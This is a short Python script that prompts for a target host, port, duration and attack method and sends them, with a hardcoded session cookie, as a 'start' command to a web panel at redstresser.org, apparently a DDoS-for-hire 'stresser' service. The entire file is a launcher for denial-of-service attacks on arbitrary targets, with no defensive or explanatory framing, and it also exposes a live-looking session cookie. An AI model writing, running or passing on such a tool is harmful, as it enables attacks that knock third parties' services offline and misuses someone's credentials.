import requests

API_SEX = 'https://redstresser.org/complexx/adminhub.php'

def send_request(host, port, time, method):
    params = {
        'type': 'start',
        'host': host,
        'port': port,
        'time': time,
        'method': method,
        'totalservers': 1
    }

    HAIBE = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'cookie': '_ga=GA1.1.776253698.1723006015; PHPSESSID=m78pvvb1jgvpgopa8imecbcpv6; _ga_CQ0717FTC6=GS1.1.1726250376.19.1.1726250635.0.0.0',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    }

    response = requests.get(API_SEX, headers=HAIBE, params=params)

    if response.status_code == 200:
        print("Successfully Sent To All Servers")
        print("!")
        print(response.text)
    else:
        print(f"ERROT")

def main():
    host = input("Enter Host: ")
    port = input("Enter Port: ")
    time = input("Enter Time: ")
    method = input("Enter Method: ")

    send_request(host, port, time, method)

if __name__ == '__main__':
    main()
